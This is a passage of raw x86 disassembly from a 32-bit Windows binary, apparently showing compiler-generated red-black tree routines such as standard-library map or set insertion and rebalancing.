   14051:	push   DWORD PTR ds:0x7f8b8
   14057:	mov    ecx,esi
   14059:	call   0x1396e
   1405e:	mov    DWORD PTR [esi+0xc],edi
   14061:	mov    DWORD PTR [esi+0x4],eax
   14064:	mov    DWORD PTR [eax],eax
   14066:	mov    esi,DWORD PTR [esi+0x4]
   14069:	pop    edi
   1406a:	mov    DWORD PTR [esi+0x8],esi
   1406d:	pop    esi
   1406e:	ret    
   1406f:	int3   
   14070:	int3   
   14071:	int3   
   14072:	int3   
   14073:	int3   
   14074:	mov    edi,edi
   14076:	push   ebp
   14077:	mov    ebp,esp
   14079:	push   esi
   1407a:	push   edi
   1407b:	push   DWORD PTR [ebp+0xc]
   1407e:	mov    edi,ecx
   14080:	call   0x13132
   14085:	push   DWORD PTR [ebp+0xc]
   14088:	mov    ecx,edi
   1408a:	mov    esi,eax
   1408c:	call   0x12e1a
   14091:	mov    ecx,DWORD PTR [ebp+0x8]
   14094:	pop    edi
   14095:	mov    DWORD PTR [ecx],eax
   14097:	mov    DWORD PTR [ecx+0x4],esi
   1409a:	mov    eax,ecx
   1409c:	pop    esi
   1409d:	pop    ebp
   1409e:	ret    0x8
   140a1:	int3   
   140a2:	int3   
   140a3:	int3   
   140a4:	int3   
   140a5:	int3   
   140a6:	mov    edi,edi
   140a8:	push   esi
   140a9:	push   edi
   140aa:	push   0x1
   140ac:	xor    edi,edi
   140ae:	push   edi
   140af:	mov    esi,ecx
   140b1:	call   0x13992
   140b6:	cmp    DWORD PTR ds:0x7f8c4,edi
   140bc:	jne    0x140d3
   140be:	mov    ecx,eax
   140c0:	mov    DWORD PTR ds:0x7f8c4,ecx
   140c6:	mov    DWORD PTR [ecx],edi
   140c8:	mov    ecx,DWORD PTR ds:0x7f8c4
   140ce:	xor    eax,eax
   140d0:	mov    DWORD PTR [ecx+0x8],edi
   140d3:	inc    DWORD PTR ds:0x7fa1c
   140d9:	cmp    eax,edi
   140db:	je     0x140e4
   140dd:	push   eax
   140de:	call   0x10a86
   140e3:	pop    ecx
   140e4:	push   edi
   140e5:	push   DWORD PTR ds:0x7f8c4
   140eb:	mov    ecx,esi
   140ed:	call   0x13992
   140f2:	mov    DWORD PTR [esi+0xc],edi
   140f5:	mov    DWORD PTR [esi+0x4],eax
   140f8:	mov    DWORD PTR [eax],eax
   140fa:	mov    esi,DWORD PTR [esi+0x4]
   140fd:	pop    edi
   140fe:	mov    DWORD PTR [esi+0x8],esi
   14101:	pop    esi
   14102:	ret    
   14103:	int3   
   14104:	int3   
   14105:	int3   
   14106:	int3   
   14107:	int3   
   14108:	mov    edi,edi
   1410a:	push   ebp
   1410b:	mov    ebp,esp
   1410d:	push   esi
   1410e:	push   edi
   1410f:	push   DWORD PTR [ebp+0xc]
   14112:	mov    edi,ecx
   14114:	call   0x13210
   14119:	push   DWORD PTR [ebp+0xc]
   1411c:	mov    ecx,edi
   1411e:	mov    esi,eax
   14120:	call   0x12e5a
   14125:	mov    ecx,DWORD PTR [ebp+0x8]
   14128:	pop    edi
   14129:	mov    DWORD PTR [ecx],eax
   1412b:	mov    DWORD PTR [ecx+0x4],esi
   1412e:	mov    eax,ecx
   14130:	pop    esi
   14131:	pop    ebp
   14132:	ret    0x8
   14135:	int3   
   14136:	int3   
   14137:	int3   
   14138:	int3   
   14139:	int3   
   1413a:	mov    edi,edi
   1413c:	push   esi
   1413d:	push   edi
   1413e:	push   0x1
   14140:	xor    edi,edi
   14142:	push   edi
   14143:	mov    esi,ecx
   14145:	call   0x139fe
   1414a:	cmp    DWORD PTR ds:0x7f8c8,edi
   14150:	jne    0x14167
   14152:	mov    ecx,eax
   14154:	mov    DWORD PTR ds:0x7f8c8,ecx
   1415a:	mov    DWORD PTR [ecx],edi
   1415c:	mov    ecx,DWORD PTR ds:0x7f8c8
   14162:	xor    eax,eax
   14164:	mov    DWORD PTR [ecx+0x8],edi
   14167:	inc    DWORD PTR ds:0x7fa20
   1416d:	cmp    eax,edi
   1416f:	je     0x14178
   14171:	push   eax
   14172:	call   0x10a86
   14177:	pop    ecx
   14178:	push   edi
   14179:	push   DWORD PTR ds:0x7f8c8
   1417f:	mov    ecx,esi
   14181:	call   0x139fe
   14186:	mov    DWORD PTR [esi+0xc],edi
   14189:	mov    DWORD PTR [esi+0x4],eax
   1418c:	mov    DWORD PTR [eax],eax
   1418e:	mov    esi,DWORD PTR [esi+0x4]
   14191:	pop    edi
   14192:	mov    DWORD PTR [esi+0x8],esi
   14195:	pop    esi
   14196:	ret    
   14197:	int3   
   14198:	int3   
   14199:	int3   
   1419a:	int3   
   1419b:	int3   
   1419c:	mov    edi,edi
   1419e:	push   ebp
   1419f:	mov    ebp,esp
   141a1:	push   esi
   141a2:	push   edi
   141a3:	push   DWORD PTR [ebp+0xc]
   141a6:	mov    edi,ecx
   141a8:	call   0x132ee
   141ad:	push   DWORD PTR [ebp+0xc]
   141b0:	mov    ecx,edi
   141b2:	mov    esi,eax
   141b4:	call   0x12e9a
   141b9:	mov    ecx,DWORD PTR [ebp+0x8]
   141bc:	pop    edi
   141bd:	mov    DWORD PTR [ecx],eax
   141bf:	mov    DWORD PTR [ecx+0x4],esi
   141c2:	mov    eax,ecx
   141c4:	pop    esi
   141c5:	pop    ebp
   141c6:	ret    0x8
   141c9:	int3   
   141ca:	int3   
   141cb:	int3   
   141cc:	int3   
   141cd:	int3   
   141ce:	mov    edi,edi
   141d0:	push   esi
   141d1:	push   edi
   141d2:	push   0x1
   141d4:	xor    edi,edi
   141d6:	push   edi
   141d7:	mov    esi,ecx
   141d9:	call   0x1396e
   141de:	cmp    DWORD PTR ds:0x7f8cc,edi
   141e4:	jne    0x141fb
   141e6:	mov    ecx,eax
   141e8:	mov    DWORD PTR ds:0x7f8cc,ecx
   141ee:	mov    DWORD PTR [ecx],edi
   141f0:	mov    ecx,DWORD PTR ds:0x7f8cc
   141f6:	xor    eax,eax
   141f8:	mov    DWORD PTR [ecx+0x8],edi
   141fb:	inc    DWORD PTR ds:0x7fa24
   14201:	cmp    eax,edi
   14203:	je     0x1420c
   14205:	push   eax
   14206:	call   0x10a86
   1420b:	pop    ecx
   1420c:	push   edi
   1420d:	push   DWORD PTR ds:0x7f8cc
   14213:	mov    ecx,esi
   14215:	call   0x1396e
   1421a:	mov    DWORD PTR [esi+0xc],edi
   1421d:	mov    DWORD PTR [esi+0x4],eax
   14220:	mov    DWORD PTR [eax],eax
   14222:	mov    esi,DWORD PTR [esi+0x4]
   14225:	pop    edi
   14226:	mov    DWORD PTR [esi+0x8],esi
   14229:	pop    esi
   1422a:	ret    
   1422b:	int3   
   1422c:	int3   
   1422d:	int3   
   1422e:	int3   
   1422f:	int3   
   14230:	mov    edi,edi
   14232:	push   ebp
   14233:	mov    ebp,esp
   14235:	push   ecx
   14236:	push   esi
   14237:	push   DWORD PTR [ebp+0xc]
   1423a:	mov    esi,ecx
   1423c:	call   0x13326
   14241:	mov    DWORD PTR [ebp-0x4],eax
   14244:	cmp    eax,DWORD PTR [esi+0x4]
   14247:	je     0x1425e
   14249:	add    eax,0xc
   1424c:	push   eax
   1424d:	push   DWORD PTR [ebp+0xc]
   14250:	call   0x19824
   14255:	test   al,al
   14257:	jne    0x1425e
   14259:	lea    eax,[ebp-0x4]
   1425c:	jmp    0x14267
   1425e:	mov    eax,DWORD PTR [esi+0x4]
   14261:	mov    DWORD PTR [ebp+0xc],eax
   14264:	lea    eax,[ebp+0xc]
   14267:	mov    ecx,DWORD PTR [eax]
   14269:	mov    eax,DWORD PTR [ebp+0x8]
   1426c:	mov    DWORD PTR [eax],ecx
   1426e:	pop    esi
   1426f:	leave  
   14270:	ret    0x8
   14273:	int3   
   14274:	int3   
   14275:	int3   
   14276:	int3   
   14277:	int3   
   14278:	mov    edi,edi
   1427a:	push   ebp
   1427b:	mov    ebp,esp
   1427d:	push   ecx
   1427e:	push   ecx
   1427f:	push   ebx
   14280:	push   esi
   14281:	mov    DWORD PTR [ebp-0x4],ecx
   14284:	push   edi
   14285:	mov    edi,DWORD PTR [ebp+0xc]
   14288:	lea    ecx,[ebp+0xc]
   1428b:	call   0x12f48
   14290:	mov    esi,DWORD PTR [edi]
   14292:	mov    eax,ds:0x7f8bc
   14297:	mov    ebx,edi
   14299:	mov    DWORD PTR [ebp-0x8],esi
   1429c:	cmp    esi,eax
   1429e:	jne    0x142bc
   142a0:	mov    esi,DWORD PTR [edi+0x8]
   142a3:	mov    eax,DWORD PTR [ebx+0x4]
   142a6:	mov    ecx,DWORD PTR [ebp-0x4]
   142a9:	mov    DWORD PTR [esi+0x4],eax
   142ac:	mov    eax,DWORD PTR [ecx+0x4]
   142af:	cmp    DWORD PTR [eax+0x4],edi
   142b2:	jne    0x14331
   142b4:	mov    DWORD PTR [eax+0x4],esi
   142b7:	jmp    0x1433f
   142bc:	mov    ecx,DWORD PTR [edi+0x8]
   142bf:	cmp    ecx,eax
   142c1:	je     0x142a3
   142c3:	push   ecx
   142c4:	call   0x1122e
   142c9:	mov    ebx,eax
   142cb:	mov    esi,DWORD PTR [ebx+0x8]
   142ce:	cmp    ebx,edi
   142d0:	je     0x142a3
   142d2:	mov    eax,DWORD PTR [ebp-0x8]
   142d5:	mov    DWORD PTR [eax+0x4],ebx
   142d8:	mov    eax,DWORD PTR [edi]
   142da:	mov    DWORD PTR [ebx],eax
   142dc:	cmp    ebx,DWORD PTR [edi+0x8]
   142df:	jne    0x142e6
   142e1:	mov    DWORD PTR [esi+0x4],ebx
   142e4:	jmp    0x142fd
   142e6:	mov    eax,DWORD PTR [ebx+0x4]
   142e9:	mov    DWORD PTR [esi+0x4],eax
   142ec:	mov    eax,DWORD PTR [ebx+0x4]
   142ef:	mov    DWORD PTR [eax],esi
   142f1:	mov    eax,DWORD PTR [edi+0x8]
   142f4:	mov    DWORD PTR [ebx+0x8],eax
   142f7:	mov    eax,DWORD PTR [edi+0x8]
   142fa:	mov    DWORD PTR [eax+0x4],ebx
   142fd:	mov    eax,DWORD PTR [ebp-0x4]
   14300:	mov    eax,DWORD PTR [eax+0x4]
   14303:	cmp    DWORD PTR [eax+0x4],edi
   14306:	jne    0x1430d
   14308:	mov    DWORD PTR [eax+0x4],ebx
   1430b:	jmp    0x1431b
   1430d:	mov    eax,DWORD PTR [edi+0x4]
   14310:	cmp    DWORD PTR [eax],edi
   14312:	jne    0x14318
   14314:	mov    DWORD PTR [eax],ebx
   14316:	jmp    0x1431b
   14318:	mov    DWORD PTR [eax+0x8],ebx
   1431b:	mov    eax,DWORD PTR [edi+0x4]
   1431e:	mov    DWORD PTR [ebx+0x4],eax
   14321:	mov    eax,DWORD PTR [ebx+0x10]
   14324:	mov    ecx,DWORD PTR [edi+0x10]
   14327:	mov    DWORD PTR [ebx+0x10],ecx
   1432a:	mov    DWORD PTR [edi+0x10],eax
   1432d:	mov    ebx,edi
   1432f:	jmp    0x14392
   14331:	mov    eax,DWORD PTR [edi+0x4]
   14334:	cmp    DWORD PTR [eax],edi
   14336:	jne    0x1433c
   14338:	mov    DWORD PTR [eax],esi
   1433a:	jmp    0x1433f
   1433c:	mov    DWORD PTR [eax+0x8],esi
   1433f:	mov    eax,DWORD PTR [ecx+0x4]
   14342:	mov    DWORD PTR [ebp-0x8],eax
   14345:	cmp    DWORD PTR [eax],edi
   14347:	jne    0x14369
   14349:	mov    edx,DWORD PTR [edi+0x8]
   1434c:	cmp    edx,DWORD PTR ds:0x7f8bc
   14352:	jne    0x1435b
   14354:	mov    edx,DWORD PTR [edi+0x4]
   14357:	mov    DWORD PTR [eax],edx
   14359:	jmp    0x14369
   1435b:	push   esi
   1435c:	call   0x1122e
   14361:	mov    ecx,DWORD PTR [ebp-0x8]
   14364:	mov    DWORD PTR [ecx],eax
   14366:	mov    ecx,DWORD PTR [ebp-0x4]
   14369:	mov    eax,DWORD PTR [ecx+0x4]
   1436c:	mov    DWORD PTR [ebp-0x8],eax
   1436f:	cmp    DWORD PTR [eax+0x8],edi
   14372:	jne    0x14392
   14374:	mov    ecx,DWORD PTR [edi]
   14376:	cmp    ecx,DWORD PTR ds:0x7f8bc
   1437c:	jne    0x14386
   1437e:	mov    ecx,DWORD PTR [edi+0x4]
   14381:	mov    DWORD PTR [eax+0x8],ecx
   14384:	jmp    0x14392
   14386:	push   esi
   14387:	call   0x1120c
   1438c:	mov    ecx,DWORD PTR [ebp-0x8]
   1438f:	mov    DWORD PTR [ecx+0x8],eax
   14392:	xor    edi,edi
   14394:	inc    edi
   14395:	cmp    DWORD PTR [ebx+0x10],edi
   14398:	jne    0x144af
   1439e:	jmp    0x1445d
   143a3:	cmp    DWORD PTR [esi+0x10],edi
   143a6:	jne    0x144ac
   143ac:	mov    eax,DWORD PTR [esi+0x4]
   143af:	cmp    esi,DWORD PTR [eax]
   143b1:	jne    0x14428
   143b3:	mov    eax,DWORD PTR [eax+0x8]
   143b6:	cmp    DWORD PTR [eax+0x10],0x0
   143ba:	jne    0x143d4
   143bc:	mov    DWORD PTR [eax+0x10],edi
   143bf:	mov    eax,DWORD PTR [esi+0x4]
   143c2:	and    DWORD PTR [eax+0x10],0x0
   143c6:	push   DWORD PTR [esi+0x4]
   143c9:	call   0x12f7e
   143ce:	mov    eax,DWORD PTR [esi+0x4]
   143d1:	mov    eax,DWORD PTR [eax+0x8]
   143d4:	mov    ecx,DWORD PTR [eax]
   143d6:	cmp    DWORD PTR [ecx+0x10],edi
   143d9:	jne    0x143e3
   143db:	mov    ecx,DWORD PTR [eax+0x8]
   143de:	cmp    DWORD PTR [ecx+0x10],edi
   143e1:	je     0x14456
   143e3:	mov    ecx,DWORD PTR [eax+0x8]
   143e6:	cmp    DWORD PTR [ecx+0x10],edi
   143e9:	jne    0x14403
   143eb:	mov    ecx,DWORD PTR [eax]
   143ed:	mov    DWORD PTR [ecx+0x10],edi
   143f0:	mov    ecx,DWORD PTR [ebp-0x4]
   143f3:	and    DWORD PTR [eax+0x10],0x0
   143f7:	push   eax
   143f8:	call   0x12fcc
   143fd:	mov    eax,DWORD PTR [esi+0x4]
   14400:	mov    eax,DWORD PTR [eax+0x8]
   14403:	mov    ecx,DWORD PTR [esi+0x4]
   14406:	mov    ecx,DWORD PTR [ecx+0x10]
   14409:	mov    DWORD PTR [eax+0x10],ecx
   1440c:	mov    ecx,DWORD PTR [esi+0x4]
   1440f:	mov    DWORD PTR [ecx+0x10],edi
   14412:	mov    eax,DWORD PTR [eax+0x8]
   14415:	mov    ecx,DWORD PTR [ebp-0x4]
   14418:	mov    DWORD PTR [eax+0x10],edi
   1441b:	push   DWORD PTR [esi+0x4]
   1441e:	call   0x12f7e
   14423:	jmp    0x144ac
   14428:	mov    eax,DWORD PTR [eax]
   1442a:	cmp    DWORD PTR [eax+0x10],0x0
   1442e:	jne    0x14447
   14430:	mov    DWORD PTR [eax+0x10],edi
   14433:	mov    eax,DWORD PTR [esi+0x4]
   14436:	and    DWORD PTR [eax+0x10],0x0
   1443a:	push   DWORD PTR [esi+0x4]
   1443d:	call   0x12fcc
   14442:	mov    eax,DWORD PTR [esi+0x4]
   14445:	mov    eax,DWORD PTR [eax]
   14447:	mov    ecx,DWORD PTR [eax+0x8]
   1444a:	cmp    DWORD PTR [ecx+0x10],edi
   1444d:	jne    0x1446e
   1444f:	mov    ecx,DWORD PTR [eax]
   14451:	cmp    DWORD PTR [ecx+0x10],edi
   14454:	jne    0x1446e
   14456:	and    DWORD PTR [eax+0x10],0x0
   1445a:	mov    esi,DWORD PTR [esi+0x4]
   1445d:	mov    ecx,DWORD PTR [ebp-0x4]
   14460:	mov    eax,DWORD PTR [ecx+0x4]
   14463:	cmp    esi,DWORD PTR [eax+0x4]
   14466:	jne    0x143a3
   1446c:	jmp    0x144ac
   1446e:	mov    ecx,DWORD PTR [eax]
   14470:	cmp    DWORD PTR [ecx+0x10],edi
   14473:	jne    0x1448d
   14475:	mov    ecx,DWORD PTR [eax+0x8]
   14478:	mov    DWORD PTR [ecx+0x10],edi
   1447b:	mov    ecx,DWORD PTR [ebp-0x4]
   1447e:	and    DWORD PTR [eax+0x10],0x0
   14482:	push   eax
   14483:	call   0x12f7e
   14488:	mov    eax,DWORD PTR [esi+0x4]
   1448b:	mov    eax,DWORD PTR [eax]
   1448d:	mov    ecx,DWORD PTR [esi+0x4]
   14490:	mov    ecx,DWORD PTR [ecx+0x10]
   14493:	mov    DWORD PTR [eax+0x10],ecx
   14496:	mov    ecx,DWORD PTR [esi+0x4]
   14499:	mov    DWORD PTR [ecx+0x10],edi
   1449c:	mov    eax,DWORD PTR [eax]
   1449e:	mov    ecx,DWORD PTR [ebp-0x4]
   144a1:	mov    DWORD PTR [eax+0x10],edi
   144a4:	push   DWORD PTR [esi+0x4]
   144a7:	call   0x12fcc
   144ac:	mov    DWORD PTR [esi+0x10],edi
   144af:	push   ebx
   144b0:	call   0x10a86
   144b5:	mov    eax,DWORD PTR [ebp-0x4]
   144b8:	dec    DWORD PTR [eax+0xc]
   144bb:	mov    eax,DWORD PTR [ebp+0x8]
   144be:	pop    ecx
   144bf:	mov    ecx,DWORD PTR [ebp+0xc]
   144c2:	pop    edi
   144c3:	pop    esi
   144c4:	mov    DWORD PTR [eax],ecx
   144c6:	pop    ebx
   144c7:	leave  
   144c8:	ret    0x8
   144cb:	int3   
   144cc:	int3   
   144cd:	int3   
   144ce:	int3   
   144cf:	int3   
   144d0:	mov    edi,edi
   144d2:	push   ebp
   144d3:	mov    ebp,esp
   144d5:	push   esi
   144d6:	push   edi
   144d7:	push   DWORD PTR [ebp+0xc]
   144da:	mov    edi,ecx
   144dc:	call   0x1347c
   144e1:	push   DWORD PTR [ebp+0xc]
   144e4:	mov    ecx,edi
   144e6:	mov    esi,eax
   144e8:	call   0x13444
   144ed:	mov    ecx,DWORD PTR [ebp+0x8]
   144f0:	pop    edi
   144f1:	mov    DWORD PTR [ecx],eax
   144f3:	mov    DWORD PTR [ecx+0x4],esi
   144f6:	mov    eax,ecx
   144f8:	pop    esi
   144f9:	pop    ebp
   144fa:	ret    0x8
   144fd:	int3   
   144fe:	int3   
   144ff:	int3   
   14500:	int3   
   14501:	int3   
   14502:	mov    edi,edi
   14504:	push   esi
   14505:	push   edi
   14506:	push   0x1
   14508:	xor    edi,edi
   1450a:	push   edi
   1450b:	mov    esi,ecx
   1450d:	call   0x139b6
   14512:	cmp    DWORD PTR ds:0x7f8bc,edi
   14518:	jne    0x1452f
   1451a:	mov    ecx,eax
   1451c:	mov    DWORD PTR ds:0x7f8bc,ecx
   14522:	mov    DWORD PTR [ecx],edi
   14524:	mov    ecx,DWORD PTR ds:0x7f8bc
   1452a:	xor    eax,eax
   1452c:	mov    DWORD PTR [ecx+0x8],edi
   1452f:	inc    DWORD PTR ds:0x7fa28
   14535:	cmp    eax,edi
   14537:	je     0x14540
   14539:	push   eax
   1453a:	call   0x10a86
   1453f:	pop    ecx
   14540:	push   edi
   14541:	push   DWORD PTR ds:0x7f8bc
   14547:	mov    ecx,esi
   14549:	call   0x139b6
   1454e:	mov    DWORD PTR [esi+0xc],edi
   14551:	mov    DWORD PTR [esi+0x4],eax
   14554:	mov    DWORD PTR [eax],eax
   14556:	mov    esi,DWORD PTR [esi+0x4]
   14559:	pop    edi
   1455a:	mov    DWORD PTR [esi+0x8],esi
   1455d:	pop    esi
   1455e:	ret    
   1455f:	int3   
   14560:	int3   
   14561:	int3   
   14562:	int3   
   14563:	int3   
   14564:	mov    edi,edi
   14566:	push   ebp
   14567:	mov    ebp,esp
   14569:	push   ebx
   1456a:	push   esi
   1456b:	mov    esi,DWORD PTR [ebp+0x10]
   1456e:	push   edi
   1456f:	push   0x0
   14571:	push   esi
   14572:	mov    edi,ecx
   14574:	call   0x139b6
   14579:	push   DWORD PTR [ebp+0x14]
   1457c:	mov    ebx,eax
   1457e:	mov    eax,ds:0x7f8bc
   14583:	mov    DWORD PTR [ebx],eax
   14585:	mov    eax,ds:0x7f8bc
   1458a:	mov    DWORD PTR [ebx+0x8],eax
   1458d:	lea    eax,[ebx+0xc]
   14590:	push   eax
   14591:	call   0x1a3a2
   14596:	inc    DWORD PTR [edi+0xc]
   14599:	cmp    esi,DWORD PTR [edi+0x4]
   1459c:	je     0x145c0
   1459e:	mov    eax,DWORD PTR [ebp+0xc]
   145a1:	cmp    eax,DWORD PTR ds:0x7f8bc
   145a7:	jne    0x145c0
   145a9:	mov    eax,DWORD PTR [ebp+0x14]
   145ac:	mov    eax,DWORD PTR [eax]
   145ae:	cmp    eax,DWORD PTR [esi+0xc]
   145b1:	jb     0x145c0
   145b3:	mov    DWORD PTR [esi+0x8],ebx
   145b6:	mov    eax,DWORD PTR [edi+0x4]
   145b9:	cmp    esi,DWORD PTR [eax+0x8]
   145bc:	jne    0x145da
   145be:	jmp    0x145cf
   145c0:	mov    DWORD PTR [esi],ebx
   145c2:	mov    eax,DWORD PTR [edi+0x4]
   145c5:	cmp    esi,eax
   145c7:	jne    0x145d4
   145c9:	mov    DWORD PTR [eax+0x4],ebx
   145cc:	mov    eax,DWORD PTR [edi+0x4]
   145cf:	mov    DWORD PTR [eax+0x8],ebx
   145d2:	jmp    0x145da
   145d4:	cmp    esi,DWORD PTR [eax]
   145d6:	jne    0x145da
   145d8:	mov    DWORD PTR [eax],ebx
   145da:	mov    eax,DWORD PTR [edi+0x4]
   145dd:	mov    esi,ebx
   145df:	cmp    ebx,DWORD PTR [eax+0x4]
   145e2:	je     0x14696
   145e8:	mov    eax,DWORD PTR [esi+0x4]
   145eb:	xor    edx,edx
   145ed:	cmp    DWORD PTR [eax+0x10],edx
   145f0:	jne    0x14696
   145f6:	mov    ecx,DWORD PTR [eax+0x4]
   145f9:	cmp    eax,DWORD PTR [ecx]
   145fb:	jne    0x14637
   145fd:	mov    ecx,DWORD PTR [ecx+0x8]
   14600:	cmp    DWORD PTR [ecx+0x10],edx
   14603:	je     0x1463e
   14605:	cmp    esi,DWORD PTR [eax+0x8]
   14608:	jne    0x14614
   1460a:	mov    esi,eax
   1460c:	push   esi
   1460d:	mov    ecx,edi
   1460f:	call   0x12f7e
   14614:	mov    eax,DWORD PTR [esi+0x4]
   14617:	mov    DWORD PTR [eax+0x10],0x1
   1461e:	mov    eax,DWORD PTR [esi+0x4]
   14621:	mov    eax,DWORD PTR [eax+0x4]
   14624:	and    DWORD PTR [eax+0x10],0x0
   14628:	mov    eax,DWORD PTR [esi+0x4]
   1462b:	push   DWORD PTR [eax+0x4]
   1462e:	mov    ecx,edi
   14630:	call   0x12fcc
   14635:	jmp    0x1468a
   14637:	mov    ecx,DWORD PTR [ecx]
   14639:	cmp    DWORD PTR [ecx+0x10],edx
   1463c:	jne    0x1465b
   1463e:	mov    edx,eax
   14640:	xor    eax,eax
   14642:	inc    eax
   14643:	mov    DWORD PTR [edx+0x10],eax
   14646:	mov    DWORD PTR [ecx+0x10],eax
   14649:	mov    eax,DWORD PTR [esi+0x4]
   1464c:	mov    eax,DWORD PTR [eax+0x4]
   1464f:	and    DWORD PTR [eax+0x10],0x0
   14653:	mov    eax,DWORD PTR [esi+0x4]
   14656:	mov    esi,DWORD PTR [eax+0x4]
   14659:	jmp    0x1468a
   1465b:	cmp    esi,DWORD PTR [eax]
   1465d:	jne    0x14669
   1465f:	mov    esi,eax
   14661:	push   esi
   14662:	mov    ecx,edi
   14664:	call   0x12fcc
   14669:	mov    eax,DWORD PTR [esi+0x4]
   1466c:	mov    DWORD PTR [eax+0x10],0x1
   14673:	mov    eax,DWORD PTR [esi+0x4]
   14676:	mov    eax,DWORD PTR [eax+0x4]
   14679:	and    DWORD PTR [eax+0x10],0x0
   1467d:	mov    eax,DWORD PTR [esi+0x4]
   14680:	push   DWORD PTR [eax+0x4]
   14683:	mov    ecx,edi
   14685:	call   0x12f7e
   1468a:	mov    eax,DWORD PTR [edi+0x4]
   1468d:	cmp    esi,DWORD PTR [eax+0x4]
   14690:	jne    0x145e8
   14696:	mov    eax,DWORD PTR [edi+0x4]
   14699:	mov    eax,DWORD PTR [eax+0x4]
   1469c:	pop    edi
   1469d:	mov    DWORD PTR [eax+0x10],0x1
   146a4:	mov    eax,DWORD PTR [ebp+0x8]
   146a7:	pop    esi
   146a8:	mov    DWORD PTR [eax],ebx
   146aa:	pop    ebx
   146ab:	pop    ebp
   146ac:	ret    0x10
   146af:	int3   
   146b0:	int3   
   146b1:	int3   
   146b2:	int3   
   146b3:	int3   
   146b4:	mov    edi,edi
   146b6:	push   esi
   146b7:	push   edi
   146b8:	push   0x1
   146ba:	xor    edi,edi
   146bc:	push   edi
   146bd:	mov    esi,ecx
   146bf:	call   0x139da
   146c4:	cmp    DWORD PTR ds:0x7f8c0,edi
   146ca:	jne    0x146e1
   146cc:	mov    ecx,eax
   146ce:	mov    DWORD PTR ds:0x7f8c0,ecx
   146d4:	mov    DWORD PTR [ecx],edi
   146d6:	mov    ecx,DWORD PTR ds:0x7f8c0
   146dc:	xor    eax,eax
   146de:	mov    DWORD PTR [ecx+0x8],edi
   146e1:	inc    DWORD PTR ds:0x7fa2c
   146e7:	cmp    eax,edi
   146e9:	je     0x146f2
   146eb:	push   eax
   146ec:	call   0x10a86
   146f1:	pop    ecx
   146f2:	push   edi
   146f3:	push   DWORD PTR ds:0x7f8c0
   146f9:	mov    ecx,esi
   146fb:	call   0x139da
   14700:	mov    DWORD PTR [esi+0xc],edi
   14703:	mov    DWORD PTR [esi+0x4],eax
   14706:	mov    DWORD PTR [eax],eax
   14708:	mov    esi,DWORD PTR [esi+0x4]
   1470b:	pop    edi
   1470c:	mov    DWORD PTR [esi+0x8],esi
   1470f:	pop    esi
   14710:	ret    
   14711:	int3   
   14712:	int3   
   14713:	int3   
   14714:	int3   
   14715:	int3   
   14716:	mov    edi,edi
   14718:	push   ebp
   14719:	mov    ebp,esp
   1471b:	push   ebx
   1471c:	push   esi
   1471d:	mov    esi,DWORD PTR [ebp+0x10]
   14720:	push   edi
   14721:	push   0x0
   14723:	push   esi
   14724:	mov    edi,ecx
   14726:	call   0x1396e
   1472b:	push   DWORD PTR [ebp+0x14]
   1472e:	mov    ebx,eax
   14730:	mov    eax,ds:0x7f8b8
   14735:	mov    DWORD PTR [ebx],eax
   14737:	mov    eax,ds:0x7f8b8
   1473c:	mov    DWORD PTR [ebx+0x8],eax
   1473f:	lea    eax,[ebx+0xc]
   14742:	push   eax
   14743:	call   0x11644
   14748:	inc    DWORD PTR [edi+0xc]
   1474b:	cmp    esi,DWORD PTR [edi+0x4]
   1474e:	je     0x14772
   14750:	mov    eax,DWORD PTR [ebp+0xc]
   14753:	cmp    eax,DWORD PTR ds:0x7f8b8
   14759:	jne    0x14772
   1475b:	mov    eax,DWORD PTR [ebp+0x14]
   1475e:	mov    eax,DWORD PTR [eax]
   14760:	cmp    eax,DWORD PTR [esi+0xc]
   14763:	jb     0x14772
   14765:	mov    DWORD PTR [esi+0x8],ebx
   14768:	mov    eax,DWORD PTR [edi+0x4]
   1476b:	cmp    esi,DWORD PTR [eax+0x8]
   1476e:	jne    0x1478c
   14770:	jmp    0x14781
   14772:	mov    DWORD PTR [esi],ebx
   14774:	mov    eax,DWORD PTR [edi+0x4]
   14777:	cmp    esi,eax
   14779:	jne    0x14786
   1477b:	mov    DWORD PTR [eax+0x4],ebx
   1477e:	mov    eax,DWORD PTR [edi+0x4]
   14781:	mov    DWORD PTR [eax+0x8],ebx
   14784:	jmp    0x1478c
   14786:	cmp    esi,DWORD PTR [eax]
   14788:	jne    0x1478c
   1478a:	mov    DWORD PTR [eax],ebx
   1478c:	mov    eax,DWORD PTR [edi+0x4]
   1478f:	mov    esi,ebx
   14791:	cmp    ebx,DWORD PTR [eax+0x4]
   14794:	je     0x14848
   1479a:	mov    eax,DWORD PTR [esi+0x4]
   1479d:	xor    edx,edx
   1479f:	cmp    DWORD PTR [eax+0x14],edx
   147a2:	jne    0x14848
   147a8:	mov    ecx,DWORD PTR [eax+0x4]
   147ab:	cmp    eax,DWORD PTR [ecx]
   147ad:	jne    0x147e9
   147af:	mov    ecx,DWORD PTR [ecx+0x8]
   147b2:	cmp    DWORD PTR [ecx+0x14],edx
   147b5:	je     0x147f0
   147b7:	cmp    esi,DWORD PTR [eax+0x8]
   147ba:	jne    0x147c6
   147bc:	mov    esi,eax
   147be:	push   esi
   147bf:	mov    ecx,edi
   147c1:	call   0x12d7c
   147c6:	mov    eax,DWORD PTR [esi+0x4]
   147c9:	mov    DWORD PTR [eax+0x14],0x1
   147d0:	mov    eax,DWORD PTR [esi+0x4]
   147d3:	mov    eax,DWORD PTR [eax+0x4]
   147d6:	and    DWORD PTR [eax+0x14],0x0
   147da:	mov    eax,DWORD PTR [esi+0x4]
   147dd:	push   DWORD PTR [eax+0x4]
   147e0:	mov    ecx,edi
   147e2:	call   0x12dca
   147e7:	jmp    0x1483c
   147e9:	mov    ecx,DWORD PTR [ecx]
   147eb:	cmp    DWORD PTR [ecx+0x14],edx
   147ee:	jne    0x1480d
   147f0:	mov    edx,eax
   147f2:	xor    eax,eax
   147f4:	inc    eax
   147f5:	mov    DWORD PTR [edx+0x14],eax
   147f8:	mov    DWORD PTR [ecx+0x14],eax
   147fb:	mov    eax,DWORD PTR [esi+0x4]
   147fe:	mov    eax,DWORD PTR [eax+0x4]
   14801:	and    DWORD PTR [eax+0x14],0x0
   14805:	mov    eax,DWORD PTR [esi+0x4]
   14808:	mov    esi,DWORD PTR [eax+0x4]
   1480b:	jmp    0x1483c
   1480d:	cmp    esi,DWORD PTR [eax]
   1480f:	jne    0x1481b
   14811:	mov    esi,eax
   14813:	push   esi
   14814:	mov    ecx,edi
   14816:	call   0x12dca
   1481b:	mov    eax,DWORD PTR [esi+0x4]
   1481e:	mov    DWORD PTR [eax+0x14],0x1
   14825:	mov    eax,DWORD PTR [esi+0x4]
